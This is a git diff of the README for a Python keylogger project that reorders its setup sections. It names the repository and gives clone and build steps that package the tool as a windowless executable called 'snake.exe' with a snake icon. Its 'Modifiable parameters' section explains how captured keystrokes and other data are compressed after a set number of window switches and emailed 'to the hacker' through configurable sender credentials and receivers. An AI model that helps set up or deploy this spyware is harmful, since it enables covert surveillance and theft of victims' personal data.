@@ -13,15 +13,6 @@
 - MS Windows (tested on 10)
 - Python 2.7
 
-
-**Modifiable parameters**  
-- `Packing_interval` 
-  - How many the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.  
-- `email_sender` & `email_password`
-  - Mailboxes used to send packaged messages, If you use Google Mail, note that you must enable IMAP Access and "Control access to less secure apps" for your Gmial.
-- `receivers`
-  - Email address for receiving packaged information
-
 **Quick start**
 1. `git clone https://github.com/Zeal-L/Key-paste-screen-logger`
 2. `cd Key-paste-screen-logger`
@@ -37,3 +28,11 @@
 2. `python shell.py build_ext --inplace`
 3. `pyinstaller -F -w -n snake -i Snake.ico index.py`
 4. `cd dist/ && ./snake.exe `
+
+**Modifiable parameters**  
+- `Packing_interval` 
+  - How many the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.  
+- `email_sender` & `email_password`
+  - Mailboxes used to send packaged messages, If you use Google Mail, note that you must enable IMAP Access and "Control access to less secure apps" for your Gmial.
+- `receivers`
+  - Email address for receiving packaged information
